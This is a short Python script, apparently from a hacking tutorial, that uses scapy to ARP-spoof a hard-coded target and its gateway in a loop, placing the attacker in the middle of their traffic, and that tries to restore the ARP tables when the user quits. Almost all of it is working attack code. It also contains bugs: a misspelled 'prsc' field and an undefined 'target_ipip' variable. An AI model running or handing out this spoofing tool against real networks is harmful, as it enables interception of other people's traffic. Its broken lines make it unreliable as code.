import scapy.all  as scapy
import time
def get_mac(ip):  # objects formed through the classes of scapy. we used this function to get mac address for hwdst in sppoof function.
    arp_request = scapy.ARP(pdst=ip)  # sending the request in form of packets to all devices with ip stored in "scanip"
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # broadcasting the packets with mac address over the ethernet
    broadcast_arp_request = broadcast/arp_request #combining both the requests to form a single object using both instances

    answered_list = scapy.srp(broadcast_arp_request, timeout=1, verbose= False)[0]
    return answered_list[0][1].hwsrc

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, prsc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)



def spoof(target_ip, spoof_ip):  #here we use two arguments to be taken.
    target_mac = get_mac(target_ip) #here we are assigning the value of mac function to a variable to be stored in hwdst.
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose = False) #setting verbose to false will display the content on the background and not on the screen.
# THIS PORTION IS REWRITTEN AS FUNCTION BECAUSE WE NEED TO USE IT FOR THE ROUTER TOO.
#packet = scapy.ARP(op=2, pdst="target's ip", hwdst="target's mac", psrc="router's ip") # here we generated a packet with op=2 for response and fooling our target to note us as router.
#print(packet.show())
#print(packet.summary())
#scapy.send(packet)
#get_mac("router's ip")
target_ip = "10.20.0.7" #we can set this from user by using input function
gateway_ip = "10.20.0.1" #same way using input function from the user
try: #this statement give us way to try while below
    sent_packets_count = 0  # declaration as an integer
    while True: #while loop with condition as true
         spoof(target_ip, gateway_ip) #spoof function for packet sending and fooling
         spoof(gateway_ip, target_ipip)
         sent_packets_count = sent_packets_count + 2 #will add 2 everytime loop runs in this integer
         print("\r[+] Packets sent:" + str(sent_packets_count), end="") #str is used so we adapt that integer as string and avoid the error. \r and end used to print dynamic printing with overwriting each statement and adding nothing to the end.
         time.sleep(2) #take a delay of 2 seconds every time loop runs
except KeyboardInterrupt: #if user interrupts with their keyboard
        print("[+] Detected CTRL + C................Quitting!")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)#restoring the arp table of our victim after quiting.